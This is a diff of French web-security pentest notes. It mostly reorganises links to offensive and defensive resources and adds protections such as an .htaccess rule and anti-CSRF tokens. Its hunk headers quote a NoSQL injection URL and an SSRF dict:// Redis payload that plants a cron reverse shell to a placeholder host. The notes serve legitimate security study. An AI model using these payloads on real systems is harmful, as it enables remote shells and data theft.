@@ -1,4 +1,11 @@
+## Doc
+
+- [OWASP Cheatsheet Series - Top 10][https://cheatsheetseries.owasp.org/IndexTopTen.html]
+- [Mozilla Client Docs](https://developer.mozilla.org/en-US/doc)
+
 ## Outils
+
+- https://owasp.org/www-community/Source_Code_Analysis_Tools
 
 - [Burp](https://portswigger.net/burp)
 - [Curl (cheatsheet)](https://devhints.io/curl)
@@ -14,8 +21,9 @@
 
 - [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)
 
-### CRUD
+### API & CRUD
 
+- https://fastapi.tiangolo.com/
 - https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
 - https://en.wikipedia.org/wiki/Create,_read,_update_and_delete
 - https://cloud.mongodb.com
@@ -62,12 +70,12 @@ Accéder
 - [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
 - [Param Miner](https://github.com/portswigger/param-miner)
 
-## Doc
+## Cheatsheet
 
 - http://wikisecu.fr/doku.php?id=web
-- https://owasp.org/www-community/Source_Code_Analysis_Tools
+- https://infosec.mozilla.org/guidelines/web_security#web-security-cheat-sheet
+
 - [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [OWASP Cheatsheet Series - Top 10][https://cheatsheetseries.owasp.org/IndexTopTen.html]
 - [Hacktricks](https://book.hacktricks.xyz/welcome/readme), [Hacktricks - Bypass 403](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
 - [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
 - https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
@@ -101,7 +109,7 @@ $file = basename(realpath($_GET["filename"]));
 include("pages/$file");
 ?>
 ```
-et
+et `.htaccess`
 
 `allow_url_include = Off` pour PHP<7.4.0
 
@@ -162,6 +170,15 @@ https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22fl
 - https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
 - https://github.com/BorelEnzo/FuckFastcgi
 
+`Protection`:
+
+- https://stackoverflow.com/questions/1271899/disable-php-in-directory-including-all-sub-directories-with-htaccess
+
+```
+#.htaccess
+php_flag engine off
+```
+
 ### Python
 
   - `Flask`: https://ctftime.org/writeup/36100
@@ -191,6 +208,8 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 **Client**
 
+- https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
+
 ### Obfu
 
 - https://obf-io.deobfuscate.io/
@@ -209,6 +228,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 `Protection:`
 
+- anti-CSRF tokens
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value
 
 ```
